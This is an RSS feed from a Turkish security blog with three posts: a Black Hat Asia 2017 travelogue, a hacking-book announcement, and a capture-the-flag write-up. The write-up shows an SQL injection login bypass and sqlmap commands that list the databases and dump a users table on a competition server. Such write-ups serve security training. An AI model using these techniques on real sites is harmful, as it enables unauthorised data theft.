<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Mustafa ALTINKAYNAK</title><link>/</link><description>[ 'OSCP, C|EH v9, TSE', 'Cyber Security Specialist', 'Octosec' ]</description><atom:link href="/feeds/all.rss" rel="self"></atom:link><lastBuildDate>Tue, 04 Apr 2017 23:40:00 +0300</lastBuildDate><item><title>Black Hat ASIA 2017 ve Singapur Macerası</title><link>/blackhat-asia-2017-ve-singapur-macerasi.html</link><description>&lt;p&gt;1997 yılından bu yana aralıksız sürdürülen, uluslararası boyutta siber güvenlik uzmanlarının, hackerların ve istihbarat 
elemanlarının katılım gösterdiği Black Hat konferansına Mart ayı sonunda katılma fırsatını yakaladım.&lt;/p&gt;
&lt;p&gt;Singapur'a gitmeden günler öncesinde ilgili planlarımı yapmıştım. 
Dışişleri Bakanlığımız tarafından &lt;a href="http://www.mfa.gov.tr/singapur-seyahat-edecek-turk-vatandaslarinin-dikkatine.tr.mfa"&gt;bu&lt;/a&gt;
bağlantıda yaptığı açıklama üzerine pasaportumun bitiş süresini 1 sene daha uzattım. Gidiş-Dönüş uçak biletimin, konaklama faturalarımın, Black Hat biletimin çıktılarını alıp, hazır halde bulundurdum. Ek olarak bulunduğum şehirde Singapur doları bulamadığımdan dolayı bir miktar paramı, Singapur'da ülke birimine dönüştürmek üzere euro para birimine çevirdim.&lt;/p&gt;
&lt;p&gt;Bulunduğum şehirden doğrudan bir uçuş yok. Bu sebepten dolayı Samsun - İstanbul - Singapur zinciriyle uçuşumu gerçekleştirdim. 4-5 saat kadar havalimanı beklemesi ardından Singapur uçağımız havalandı. Uzun ve yorucu bir uçuş olacağını biliyordum. Singapur ülkemizden vize istemiyor. Uçakta dolduracağınız ülke giriş kartlarını havalimanından ayrılmadan teslim etmeniz gerekmektedir. Bol bol vaktim olduğundan dolayı iniş saatlerine yakın zamanda bu formu doldurdum. Yaklaşık 10,5 saat uçuşun ardından uçağımız tekerlerini Changi Havalimanına koydu.&lt;/p&gt;
&lt;h2&gt;Singapur'a giriş öncesi&lt;/h2&gt;
&lt;p&gt;Güneydoğu Asya'nın en büyük havalimanları arasında bulunan Changi'den ayrılmadan önce uçakta doldurmuş olduğum formu teslim ettim. Fakat ilk kez Singapur'a gelmemden dolayı işlemlerim 45 dakika kadar sürdü. 
Bu süre içerisinde güvenlik personelleri tarafından ne iş yaptığım, ülkeye neden geldiğim, nerede konaklayacağım, çalıştığım yere ait personel kimliğine kadar bir çok şey soruldu. Nitekim günler öncesinde hazırlamış olduğum çıktıları göstererek ilgili arkadaşın işini bir nebzede kolaylaştırdım. İşlemlerimin bitmesinin ardından simkart için Simtel satışı yapan yeri aramaya başladım. 
Singapur'da kalacağım süreyi de göz önünde bulundurarak Singtel tarafından turistlere "15S$", "30S$", "50S$" paketler şeklinde sunulan bir simkart çıkardım. 30 Singapur dolarına satın aldığım bu hat bana 10 gün geçerli olmak üzere 14 GB internet, 90 dakika da uluslararası görüşme imkanı sunuyordu. Bu benim için yeterliydi.&lt;/p&gt;
&lt;h2&gt;Havalimanından Şehire&lt;/h2&gt;
&lt;p&gt;Akşam saatleri olması nedeniyle check-in zamanınını geçirmemek için taksi ile birlikte otele geçmek durumunda kaldım. Havalimanında taksiler için kavgaya veya kargaşaya yer vermemek için taksi istasyonu yapılmış. Her ne kadar planlarımı MRT (Singapur Metro Hattı) üzerine kursam da saatin geç olmasından kaynaklı tercihimi taksi yönünde kullandım. Burada insanlar sıraya girerek sıradaki taksiye binip, havalimanından ayrılıyor. Saatinden biraz ilerlemiş olması sebebiyle bu kuyrukta çok fazla beklemeden taksiye binedilim. Yol boyunca çinli olduğunu öğrendiğim taksi sürücüsü ile 
sohbet ettik. Ülkenin çok temiz ve havalimanının büyüklüğünden bahsederken, sağda ve sol tarafta halen havalimanı terminalleri olduğunu gösterdi. 
Türkiye'yi duyup duymadığını sorduğumda İstanbul ile ilgili olumlu cevaplarını aldım. Taksici ile bu sohbetimiz Marina Bay Sand'in manzarasıyla bölündü. 25 dakikalık yolculuğun ardından 22:00 gibi otelime vardım. Çok yorgun olmama rağmen dışarı ufak da olsa keşfetmekten kendimi alıkoyamadım.
Çok şanslıydım ki Chinatown yani Çin Mahallesine kaldığım otel çok yakındı. Pazar akşamı ve saatin epeyi ilerlemiş olması sebebiyle neredeyse tüm mağazalar kapatmıştı.&lt;/p&gt;
&lt;p&gt;Yine keşif amaçlı metro hattını da ziyaret etmiştim. Çok geniş bir metro ağına sahip olan Singapur'da ulaşım oldukça kolay bir şekilde yapılabiliyor.&lt;/p&gt;
&lt;h2&gt;China Town ve Merlion Parkı&lt;/h2&gt;
&lt;p&gt;Yol yorgunluğunu kolay atlatamamış olmalıyım ki geç saatlerde uyandım. Hızlı bir kahvaltının ardından üstümü giyinip çevreyi keşife çıktım. Yakınlardaki Chinatown caddesini olabildiğince fazla gezdim.
Çoğunlukla turistlerin ilgi gösterdiği bu alanda bol bol "&lt;strong&gt;3 for 10S$&lt;/strong&gt;" gibi fiyat etiketleriyle karşılaştım. Ülkenize eliniz boş dönmemek ve ekonomik de olsun istiyorsanız kesinlikle &lt;strong&gt;ChinaTown&lt;/strong&gt;'a uğramalısınız. Ben orjinalliğinden şüphe ettiğim fakat denemek amacıyla 2 adet 12.000'lik Powerbank (20 S$), USB kablosu (2,90 S$), terlik (2,90 S$), 5 adet magnet (5 S$), 3 adet çorap (2,90 S$) ve 2 adet saat (5,8 S$) satın aldım. Türkiye piyasasına göre çok uçuk fiyatlarda var, çok çok düşük fiyatlarda. Bu arada çok iyi pazarlık yapabilen biri değilimdir fakat olan girişimlerim de sonuçsuz kaldı. Israrla fiyatların fix olduğunu ve zaten ucuza sattıklarını söylediler. &lt;/p&gt;
&lt;p&gt;Kalite anlamında çok da memnun kalmayacağınız ürünlerin çok ucuz fiyata satılması insanları buralardan alışveriş yaptırmaya yönlendiriyor. Bilhassa ülkenize dönerken hediyelik eşya seçiminde doğrudan alışverişlerinizi buralardan yapabilirsiniz.&lt;/p&gt;
&lt;p&gt;Chinatown'daki gezimin ardından yine yürüme mesafesinde bulunan &lt;strong&gt;Merlion Parkı&lt;/strong&gt;na doğru yol aldım. Yaklaşık 45 dakika süren bu yolculuğumda binaların arasından Marina Bay Sand'i görmek mümkün oluyordu. Çevre ve yollar aşırı düzenliydi. Buradaki mimarlar, müteahhitler olabildiğince beton yapıtları yeşillerle örterek şehire ayrı bir güzellik katmışlar. Trafiğin ülkemize göre tersten (soldan) akmasına kısa zamanda alıştım. Kısa süreli akan trafiğin arkasından bakarak sağladım kontroller umarım beni gülünç duruma sokmamıştır :) Devasa boyutlu gökdelenlerinden arasından ilerlerken sokakların da ayrı temiz ve düzenli olması beni çok şaşırtmıştı.&lt;/p&gt;
&lt;h2&gt;Marina Bay Sands&lt;/h2&gt;
&lt;p&gt;Şehrin çoğu noktasından sizlere hayranlıkla bakmanızı sağlayan bu yapıtın en üst katına çıkma şansına da sahip oldum. 56.katta Skypark, 57.katta ise sonsuzluk havuzu bulunuyordu. Sonsuzluk havuzuna yalnızca otel müşterilerinin kullanımına açıktı. Size sanki bir uçurumun kenarında yüzme hissi verecek olan bu deneyimi Singapur'a gelirseniz kesinlikle denemenizi öneririm.&lt;/p&gt;
&lt;h2&gt;Sentosa Adası&lt;/h2&gt;
&lt;p&gt;Sentosa bir başka deyişle söylemek gerekirse eğlence adası Singapur'un en çok turist ağırlayan noktalarından birisidir. Şehrinden herhangi bir noktasından &lt;strong&gt;HarbourFront&lt;/strong&gt; istasyonunda inmeniz durumunda Sentosa Adasına ulaşabilirsiniz. Adaya ulaşmak için dilerseniz buradaki teleferik hatlarından ya da yürüyüş bandını kullanabilirsiniz. Olabildiğince yürüyüş parkurunu kullanmanızı öneririm. &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;Bu adada yapılabilecek seçenekler geniş. Dilerseniz Universal Stüdyolarında temasından düzenlenmiş olan büyük, geniş lunaparklarda vakit geçirebilir ya da beyaz kumsallarda yürüyüşler yapabilirsiniz. Benim tercihim beyaz kumsallarda yürümek oldu. Bunun için rotamı &lt;strong&gt;Palawan&lt;/strong&gt; plajına çevirdim. Gerçekten çok harika bir kumsal sunan bu plaj aynı zamanda &lt;strong&gt;Asya kıtasının en güney noktası&lt;/strong&gt; olması nedeniyle de ayrı bir ilgimi çekmişti. Turkuaz rengi suyuyla, beyaz kumsalıyla beni kendisine hayran bırakmayı başardı. &lt;/p&gt;
&lt;h2&gt;Black Hat başlıyor!&lt;/h2&gt;
&lt;p&gt;Black Hat maillerini dikkatle takip ediyordum. Etkinlik öncesinde tarafıma gelen e-posta da kaydımı Çarşamba gününden yapmam gerektiği, Perşembe gününde kalabalık olabileceği şeklinde bilgi iletiliyordu. İlgili e-postaya uyarak Çarşamba günü erken saatlerde Marina Bay'ın etkinliğin olacağı kısmına gittim. Görkemli bir sunum hazırlığı tamamlanmış görünüyordu. Hazırlanan bilgisayarlarda kayıt sırasında girmiş olduğunuz e-posta adresiyle sorgu yaparak yaka kartınızı çıkartabiliyorsunuz. Bu aşamasının gayet güzel olduğunu ifade edebilirim. Olabildiğince insan kaynağını doğru yerlerde kullanılmasına özen gösterilmiş olduğunu fark ediyordum. &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;Çoğunluğunu Asyalıların oluşturduğu bir güvenlikçi kitlesi gördüğümü ifade edebilirim. Ek olarak yine hatırlatmak gerekirse Türkiye'den sanırım tek katılımcı bendim. Türkiye'den geldiğimi ifade ettiğim tüm herkeste kısa süreli bir şaşkınlık ifadesi olduğunu söyleyebilirim.&lt;/p&gt;
&lt;p&gt;İlk konuşma Google mühendislerinden Halvar Flake tarafından yapıldı. Neden güvenli internet inşa etmiyoruz temasıyla açılış konuşması niteliğinde bir sunum gerçekleştirdi. &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim3.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;Konuşmanın standartların aksine işlerin nasıl düzende yürüdüğümüzü sanıp, aslında da hiç de öyle olmadığını bize gösterdi.&lt;/p&gt;
&lt;p&gt;Eş zamanlı gerçekleştirilen brifing sunumları için ilgi alanlarınıza yönelik bir takvim hazırlamanız sizler için daha faydalı olacaktır. Arsenal stantlarında Haoqi Shan tarafından sunulan &lt;a href="https://www.blackhat.com/asia-17/arsenal.html#unicorns-rfid-armoury"&gt;Unicorn's RFID Armoury&lt;/a&gt; çok ilgimi çekti. Tüm Arsenal listesine &lt;a href="https://www.blackhat.com/asia-17/arsenal.html"&gt;buradan&lt;/a&gt;, brifinglerin listesine ise &lt;a href="https://www.blackhat.com/asia-17/briefings/schedule/index.html"&gt;buradan&lt;/a&gt; ulaşabilirsiniz.&lt;/p&gt;
&lt;p&gt;Bir diğer dikkatle takip ettiğim sunum Net Square CEO'su Saumil Shah tarafından yapılan &lt;strong&gt;The Seven Axioms of Security&lt;/strong&gt; isimli sunumdu. Saumil her seviyeden dinleyicinin anlayacağı şekilde eğlenceli ve eleştirisel bir yaklaşım gerçekleştirdi.&lt;/p&gt;
&lt;p&gt;Arsenal stantlarına da sunum aralarında uğramaya özen gösterdim. Shubham Mital tarafından &lt;strong&gt;Datasploit - Automated Open Source Intelligence (OSINT) Tool&lt;/strong&gt; dinleyicilere anlatıldı.&lt;/p&gt;
&lt;p&gt;Black HAT ASIA'da yorulana kadar fazla sunumlara katılmaya çalışsam da eş zamanlı gerçekleşen sunumlar arasında tercih yapmak epeyi yorucu oldu.&lt;/p&gt;
&lt;p&gt;Business Hall'da ise çok sayıda firmanın stantları yer aldı. Rapid7'den RSA'ya
 Tenable'dan NTT Security'e kadar çok sayıda firma ürünleriyle birlikte gelen katılımcıları ağırladı.&lt;/p&gt;
&lt;p&gt;En çok ilgi gören stantlar şüphesiz &lt;strong&gt;Tenable&lt;/strong&gt; ve &lt;strong&gt;Rapid7&lt;/strong&gt; firmalarının stantlarıydı. Bu stantlara sunum aralarında ne zaman baksam her daim birileri anlatılanları meraklı bir halde dinliyorlardı.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim6.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim7.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;NTT Security stantında katılımcılar Lock-picking deniyor. NTT Security bu işi yarış haline getirmiş olacak ki Lock-picking konusunda şampiyon belirlemeye çalışıyordu.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim4.jpeg" /&gt;&lt;/p&gt;
&lt;h2&gt;Özetle&lt;/h2&gt;
&lt;p&gt;Kısacası dolu dolu geçen bir Black Hat etkinliği oldu. Bir başka güzel etkinlikte olmak dileğiyle.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Tue, 04 Apr 2017 23:40:00 +0300</pubDate><guid>tag:,2017-04-04:blackhat-asia-2017-ve-singapur-macerasi.html</guid><category>Black Hat ASIA 2017</category></item><item><title>Siber Güvenlik ve Hacking Kitabı</title><link>/siber-guvenlik-ve-hacking-kitabi.html</link><description>&lt;p&gt;Yaklaşık bir seneyi aşkın süredir üzerinde çalıştığım &lt;strong&gt;"Uygulamalı Siber Güvenlik ve Hacking Kitabı"&lt;/strong&gt;
Akademik Bilişim 2017'in ilk gününde Abaküs Kitap standında satışa sunuldu.&lt;/p&gt;
&lt;h2&gt;Nerelerden satın alabilirim?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.dr.com.tr/Kitap/Uygulamali-Siber-Guvenlik-ve-Hacking/Egitim-Basvuru/Bilgisayar/urunno=0001691696001"&gt;D&amp;amp;R&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.idefix.com/Kitap/Uygulamali-Siber-Guvenlik-ve-Hacking/Mustafa-Altinkaynak/Egitim-Basvuru/Bilgisayar/urunno=0001691696001"&gt;Idefix&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.abakuskitap.com/Uygulamali-Siber-Guvenlik-ve-Hacking,PR-541.html"&gt;Abaküs Kitap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.kitapyurdu.com/kitap/uygulamali-siber-guvenlik-ve-hacking/417276.html"&gt;Kitap Yurdu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://urun.n11.com/bilgisayar-kitaplari/uygulamali-siber-guvenlik-ve-hacking-P163720810?cid=604001"&gt;n11&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.tdk.com.tr/Uygulamali-Siber-Guvenlik-ve-Hacking_46454.html"&gt;TDK&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kitapstore.com/urun/415268/kitap/abakus-kitap/mustafa-altinkaynak/uygulamali-siber-guvenlik-ve-hacking/"&gt;Kitap Store&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.kitapavrupa.com/kitap/uygulamali-siber-guvenlik-ve-hacking/417276.html"&gt;Kitap Avrupa&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.babil.com/uygulamali-siber-guvenlik-ve-hacking-kitabi-mustafa-altinkaynak"&gt;Babil&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://kitapsec.com/Products/Uygulamali-Siber-Guvenlik-ve-Hacking-Abakus-Yayinlari-135676.html"&gt;Kitapsec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.arkadas.com.tr/kitap/uygulamali-siber-guvenlik-ve-hacking/9786059129688"&gt;Arkadas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kitapsahaf.net/uygulamali-siber-guvenlik-ve-hacking-p715844.html"&gt;KitapSahaf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kitapdenizi.com/uygulamali-siber-guvenlik-ve-hacking"&gt;KitapDenizi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.nobelkitap.com/uygulamali-siber-guvenlik-ve-hacking-324654.html"&gt;NobelKitap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.eganba.com/kitap/uygulamali-siber-guvenlik-ve-hacking-mustafa-altinkaynak/9786059129688"&gt;Eganba&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pandora.com.tr/urun/uygulamali-siber-guvenlik-ve-hacking/549274"&gt;Pandora&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siber-guvenlik-ve-hacking-kitabi.jpg" /&gt;&lt;/p&gt;
&lt;h2&gt;Kitapta hangi konular yer alıyor?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Siber Güvenliğe Giriş&lt;/li&gt;
&lt;li&gt;GNU/Linux Temelleri&lt;/li&gt;
&lt;li&gt;Forensic&lt;/li&gt;
&lt;li&gt;Kriptoloji&lt;/li&gt;
&lt;li&gt;Aktif/Pasif Bilgi Toplama&lt;/li&gt;
&lt;li&gt;Port ve Servis Taramaları&lt;/li&gt;
&lt;li&gt;Web Uygulama Güvenliği&lt;/li&gt;
&lt;li&gt;OWASP&lt;/li&gt;
&lt;li&gt;Boolean-based blind SQL Injection&lt;/li&gt;
&lt;li&gt;Error-based SQL Injection&lt;/li&gt;
&lt;li&gt;UNION-based SQL Injection&lt;/li&gt;
&lt;li&gt;Time-based SQL Injection&lt;/li&gt;
&lt;li&gt;Reflected XSS&lt;/li&gt;
&lt;li&gt;Stored XSS&lt;/li&gt;
&lt;li&gt;DOM XSS&lt;/li&gt;
&lt;li&gt;XSS BeEF&lt;/li&gt;
&lt;li&gt;XSS Keylogger&lt;/li&gt;
&lt;li&gt;Local/Remote File Include&lt;/li&gt;
&lt;li&gt;CSRF&lt;/li&gt;
&lt;li&gt;CRLF Injection&lt;/li&gt;
&lt;li&gt;HTTP Parameter Pollution (HPP)&lt;/li&gt;
&lt;li&gt;Application Logic&lt;/li&gt;
&lt;li&gt;XML Entity (XXE)&lt;/li&gt;
&lt;li&gt;Remote Command Execute (RCE)&lt;/li&gt;
&lt;li&gt;Sqlmap&lt;/li&gt;
&lt;li&gt;Burp Suite&lt;/li&gt;
&lt;li&gt;Metasploit Framework&lt;/li&gt;
&lt;li&gt;Msfencode, Msfpayload&lt;/li&gt;
&lt;li&gt;Msfvenom&lt;/li&gt;
&lt;li&gt;Windows, Linux Backdoor&lt;/li&gt;
&lt;li&gt;Android Backdoor&lt;/li&gt;
&lt;li&gt;Hydra, Medusa, Mimikatz&lt;/li&gt;
&lt;li&gt;Firewall/IDS&lt;/li&gt;
&lt;li&gt;VPN&lt;/li&gt;
&lt;li&gt;DDoS&lt;/li&gt;
&lt;li&gt;SYN, HTTP, UDP Flood&lt;/li&gt;
&lt;li&gt;DNS&lt;/li&gt;
&lt;li&gt;Man-in-the-middle&lt;/li&gt;
&lt;li&gt;ARP Spoof&lt;/li&gt;
&lt;li&gt;DNS Spoof&lt;/li&gt;
&lt;li&gt;DHCP Saldırıları&lt;/li&gt;
&lt;li&gt;WEP Cracking&lt;/li&gt;
&lt;li&gt;WPA/WPA2 Cracking&lt;/li&gt;
&lt;li&gt;Tersine Mühendislik&lt;/li&gt;
&lt;li&gt;Cracking&lt;/li&gt;
&lt;li&gt;Stack Buffer Overflow&lt;/li&gt;
&lt;li&gt;Fiziksel Güvenlik&lt;/li&gt;
&lt;li&gt;BadUSB&lt;/li&gt;
&lt;li&gt;Teensy&lt;/li&gt;
&lt;li&gt;Tavsiyeler&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ve çok daha fazlasını kitap içerisinde bulabilirsiniz.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Fri, 10 Feb 2017 23:40:00 +0200</pubDate><guid>tag:,2017-02-10:siber-guvenlik-ve-hacking-kitabi.html</guid><category>Uygulamalı Siber Güvenlik ve Hacking Kitabı</category><category>Uygulamalı Siber Güvenlik ve Hacking Kitabı</category></item><item><title>BTK (USOM) Siber Yıldız Yarışması Çözümleri</title><link>/btk-usom-siber-yildiz-yarismasi-cozumleri.html</link><description>&lt;h2&gt;Siber Yıldız Yarışması nedir?&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/siber.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;Türkiye'de var olan Siber Güvenlik Uzmanlarının keşfedileceği, onları cesaretlendirip, onore edici ödüllerin de verileceği ülkemizin 2017 yılı Siber Yıldızlarının belirleneceği Siber Güvenlik Yarışmasıdır.&lt;/p&gt;
&lt;p&gt;Yarışmayı &lt;strong&gt;KırmızıBeyaz&lt;/strong&gt; ekibi olarak başarıyla tamamladık. Takım arkadaşlarım &lt;strong&gt;Hakan ERYAVUZ&lt;/strong&gt;, &lt;strong&gt;Besim ALTINOK&lt;/strong&gt; ve &lt;strong&gt;Meryem AKDOĞAN&lt;/strong&gt;'ı kutluyorum. Resmi açıklamayı bekliyoruz. Bu sürede sizlerle çözümlediğimiz soruları paylaşmak istedik. Besim Altınok'un &lt;a href="https://github.com/besimaltnok/siberyildiz"&gt;github hesabından&lt;/a&gt; diğer sorulara ulaşabilirsiniz. Sorular yazıldıkça içerik güncellenecektir.&lt;/p&gt;
&lt;h2&gt;2. Bakalım ne kadar iyisin?&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru2/1.png" /&gt;
Bu soru basit bir SQL injection sorusuydu. Başta temel SQL injection ile ilerledik. Kullanıcı adı kısmına sayfanın altında yer alan ibareden hareketle &lt;strong&gt;Yonetici&lt;/strong&gt;, parola kısmına ise &lt;strong&gt;'1 'or'='1&lt;/strong&gt; şeklinde yazdığımızda sayfa çıktısında "&lt;strong&gt;giriş yaptın&lt;/strong&gt;" şeklinde ibare aldık. Artık bariz SQL injection olduğu ortada idi.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru2/2.png" /&gt;&lt;/p&gt;
&lt;p&gt;Hedef uygulama üzerinde boolean ve time based olmak üzere iki farklı SQL injection zafiyeti tespit ettik. Bağlantımızın yavaş olması nedeniyle time based üzerinden sonuç alamayabilirdik. Bu yüzden boolean SQL injection tekniğiyle ilerledik. Sqlmap aracıyla yeni tanışanlar için basit şekilde anlatmak istiyorum.&lt;/p&gt;
&lt;p&gt;Aşağıdaki komut ile birlikte &lt;strong&gt;parola&lt;/strong&gt; parametresini hedef alarak &lt;strong&gt;dbs&lt;/strong&gt; parametresi sayesinde veritabanı listesini getirdik.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;parola&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;risk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbs&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bu komutta ise bir önceki komut ile elde ettiğimiz &lt;strong&gt;web2&lt;/strong&gt; adındaki veritabanında yer alan tüm tabloları getirdik.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;parola&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;risk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;web2&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aşağıdaki komut ile birlikte bir önceki komutlar ile elde ettiğimiz "web2" ve "kullanıcılar" tablosunun dökümünü(&lt;strong&gt;--dump&lt;/strong&gt;) aldık.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;parola&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;risk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbs&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;agent&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;web2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt; &lt;span class="n"&gt;kullanicilar&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dump&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;İlgili flag kullanıcılar tablosunda yer almaktaydı ve flag boolean tekniğiyle karşımıza geldi.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="nl"&gt;FLAG:&lt;/span&gt; &lt;span class="n"&gt;f4aa0edc033b9dfcc676c33420996789&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;3. Yetkili bir kullanıcı ile giriş yapman lazım.&lt;/h2&gt;
&lt;p&gt;Bu sayfada ise bizi websitesi karşılıyor.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru3/1.png" /&gt;&lt;/p&gt;
